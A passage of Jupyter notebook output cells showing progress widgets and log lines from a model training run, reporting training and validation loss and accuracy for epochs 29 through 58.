       "model_id": "abe6cbb8e5c742d58f9339d365127362",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:34:10 | INFO | Epoch 29 | Train Loss: 0.6261 | Train Accuracy: 0.8525\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ae790f1f8e7b40c581d127495eb66c8c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:34:23 | INFO | Validation Loss: 0.6226 | Validation Accuracy: 0.8653\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "62f8f449859c40968446274bfaa9f432",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:34:42 | INFO | Epoch 30 | Train Loss: 0.5988 | Train Accuracy: 0.8581\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "be438219d7a64b97b91710e6a8a462cd",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:34:45 | INFO | Validation Loss: 0.5934 | Validation Accuracy: 0.8750\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e0935287f89c4565a744088cf5603a18",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:35:05 | INFO | Epoch 31 | Train Loss: 0.6089 | Train Accuracy: 0.8574\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "461ce4fa88b54874abe1e1f63f56f76f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:35:07 | INFO | Validation Loss: 0.6460 | Validation Accuracy: 0.8573\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fd20068d880746cea62eed401a83f15d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:35:24 | INFO | Epoch 32 | Train Loss: 0.5805 | Train Accuracy: 0.8668\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "600b328084d64ec196c20171307f729d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:35:26 | INFO | Validation Loss: 0.6751 | Validation Accuracy: 0.8341\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "264f90350d754006be8e618a57eac58d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:35:44 | INFO | Epoch 33 | Train Loss: 0.6034 | Train Accuracy: 0.8580\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e8c98003561f4108bf4cb3f4f4bf3c6a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:35:46 | INFO | Validation Loss: 0.6590 | Validation Accuracy: 0.8399\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1c0a7893d61b4d36944bd26e577bc26d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:36:07 | INFO | Epoch 34 | Train Loss: 0.5890 | Train Accuracy: 0.8636\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "383ab8e107c44b22abe0cb93290527e8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:36:08 | INFO | Validation Loss: 0.6444 | Validation Accuracy: 0.8480\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5ee23e9834dc4580aea263760b532c06",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:36:29 | INFO | Epoch 35 | Train Loss: 0.5686 | Train Accuracy: 0.8682\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7a7f70b1610e4e10a602bc02f5f3a0a5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:36:31 | INFO | Validation Loss: 0.6176 | Validation Accuracy: 0.8550\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "809637ef8fed4724973d023107974620",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:36:49 | INFO | Epoch 36 | Train Loss: 0.5582 | Train Accuracy: 0.8723\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c9eac48a45af4849bb82d2e4382c8ee6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:36:51 | INFO | Validation Loss: 0.6742 | Validation Accuracy: 0.8289\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1480c76086104b7fb86d10416e372453",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:37:09 | INFO | Epoch 37 | Train Loss: 0.5720 | Train Accuracy: 0.8710\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "af5758db97814c1eb07146bddf268838",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:37:11 | INFO | Validation Loss: 0.6288 | Validation Accuracy: 0.8500\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3b943130a8dd434c9356153bd40fc4cf",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:37:28 | INFO | Epoch 38 | Train Loss: 0.5443 | Train Accuracy: 0.8762\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "dccd0a4264c949af963c2d2d623bf560",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:37:30 | INFO | Validation Loss: 0.6626 | Validation Accuracy: 0.8365\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7ddbbcba37634419a996ad705a4f89e8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:37:48 | INFO | Epoch 39 | Train Loss: 0.5282 | Train Accuracy: 0.8824\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "69643ad1992641599281872025d039bc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:37:50 | INFO | Validation Loss: 0.6457 | Validation Accuracy: 0.8363\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ad7dd5ae512e442287ce54c3083284d9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:38:11 | INFO | Epoch 40 | Train Loss: 0.5273 | Train Accuracy: 0.8812\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c7e1123b350a4cb19ce13429478a16c1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:38:12 | INFO | Validation Loss: 0.6301 | Validation Accuracy: 0.8417\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3b43c5baa1d14ecf9ee3dc2f471f5700",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:38:31 | INFO | Epoch 41 | Train Loss: 0.5605 | Train Accuracy: 0.8761\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ad2140add9ea4d478ac6737b79e0678e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:38:33 | INFO | Validation Loss: 0.6471 | Validation Accuracy: 0.8282\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "770d5f2a58914dd78bd833e817ab8f79",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:38:51 | INFO | Epoch 42 | Train Loss: 0.4895 | Train Accuracy: 0.8930\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5a47c916829043ebb3b8bf56a962f17a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:38:52 | INFO | Validation Loss: 0.6750 | Validation Accuracy: 0.8331\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7c2e3300ef5241109ae13cabc6953949",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:39:11 | INFO | Epoch 43 | Train Loss: 0.5039 | Train Accuracy: 0.8923\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3294c962730d4b6f8c36aea71b3cc15c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:39:13 | INFO | Validation Loss: 0.6476 | Validation Accuracy: 0.8363\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "10b29e57a27945b5881bb736868e6399",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:39:33 | INFO | Epoch 44 | Train Loss: 0.5030 | Train Accuracy: 0.8956\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d7a5a7463a0c4800ba9466b61cb06f7b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:39:35 | INFO | Validation Loss: 0.6867 | Validation Accuracy: 0.8281\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fb7f875d82b146d899d4af04e1a127ae",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:39:53 | INFO | Epoch 45 | Train Loss: 0.4951 | Train Accuracy: 0.8972\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b22f5283a8fa46c79ee687519418d504",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:39:55 | INFO | Validation Loss: 0.6975 | Validation Accuracy: 0.8203\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cb73a0328f7b4990906fafdfa667ac33",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:40:13 | INFO | Epoch 46 | Train Loss: 0.4597 | Train Accuracy: 0.9062\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "509272a86a4547208a43f6dc961db593",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:40:15 | INFO | Validation Loss: 0.7096 | Validation Accuracy: 0.8308\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "53f51fc865e34e69abaccb3b13051a0e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:40:35 | INFO | Epoch 47 | Train Loss: 0.4769 | Train Accuracy: 0.9018\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "03e27929d0a54d678e03a8b9d13d6021",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:40:37 | INFO | Validation Loss: 0.7862 | Validation Accuracy: 0.8206\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7e1d9c961cd44e4196ac06d6a9cc7496",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:40:54 | INFO | Epoch 48 | Train Loss: 0.4580 | Train Accuracy: 0.9058\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "70d997555b354d4d8b4119ad590e86e5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:40:56 | INFO | Validation Loss: 0.7340 | Validation Accuracy: 0.8225\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ec8e7f1bc10d4803ab6304112884e5e2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:41:15 | INFO | Epoch 49 | Train Loss: 0.4578 | Train Accuracy: 0.9072\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "020a52ee89744a60be2ac6ecaacbc2c2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:41:17 | INFO | Validation Loss: 0.6550 | Validation Accuracy: 0.8405\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fd762c366f6a49a0a408f7f388edbbae",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:41:37 | INFO | Epoch 50 | Train Loss: 0.4475 | Train Accuracy: 0.9090\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "38a7f8b0215b45e6b2e6608e116acd92",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:41:39 | INFO | Validation Loss: 0.7442 | Validation Accuracy: 0.8278\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4d4b8450c85643c3885db49433556428",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:41:58 | INFO | Epoch 51 | Train Loss: 0.4302 | Train Accuracy: 0.9126\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cc64a5fd58ea4598b02662eb121e9af0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:42:00 | INFO | Validation Loss: 0.7326 | Validation Accuracy: 0.8233\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "812039aa25fd444f9dba4034eae2e5b3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:42:18 | INFO | Epoch 52 | Train Loss: 0.4627 | Train Accuracy: 0.9050\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "377a5f8bff444a628673eb28f2f056cf",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:42:20 | INFO | Validation Loss: 0.6756 | Validation Accuracy: 0.8380\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6c0145ae1dd4479ea7c7351e7911dbd1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:42:39 | INFO | Epoch 53 | Train Loss: 0.4334 | Train Accuracy: 0.9119\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bab05c2e84c2479687c01f6e70598d69",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:42:40 | INFO | Validation Loss: 0.7244 | Validation Accuracy: 0.8298\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "eb2ea40f475c45099d0b8ab2c7ad8b14",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:42:58 | INFO | Epoch 54 | Train Loss: 0.4241 | Train Accuracy: 0.9135\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "012b78cba3de4b0f9bd8f2387dde6cc3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:43:00 | INFO | Validation Loss: 0.7098 | Validation Accuracy: 0.8343\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "75a9407a8bd44017a8b6cf130676d456",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:43:18 | INFO | Epoch 55 | Train Loss: 0.4435 | Train Accuracy: 0.9089\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8d25100e6c0f45eaaf14498ea7c4d26f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:43:20 | INFO | Validation Loss: 0.6836 | Validation Accuracy: 0.8452\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4663f9a5b5fb4fe7a9480a88a1f49f4c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:43:38 | INFO | Epoch 56 | Train Loss: 0.4191 | Train Accuracy: 0.9148\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4ce79ae67fdf42bc9421cf5415dc0971",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:43:39 | INFO | Validation Loss: 0.7823 | Validation Accuracy: 0.8165\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6d2a2019fbad40a7acabab5993c46c7e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:43:57 | INFO | Epoch 57 | Train Loss: 0.4295 | Train Accuracy: 0.9123\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4c653705bf2f4378b66c97c074103bb5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:43:59 | INFO | Validation Loss: 0.7534 | Validation Accuracy: 0.8308\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1921c14d92b24ae19320dd03a43c6bfa",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:44:17 | INFO | Epoch 58 | Train Loss: 0.4051 | Train Accuracy: 0.9178\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e70af43f6a4e4b9a80ea844b908166cd",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 12:44:19 | INFO | Validation Loss: 0.7099 | Validation Accuracy: 0.8347\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f6a4353f11aa46a59f25e1ea9c6f84bc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
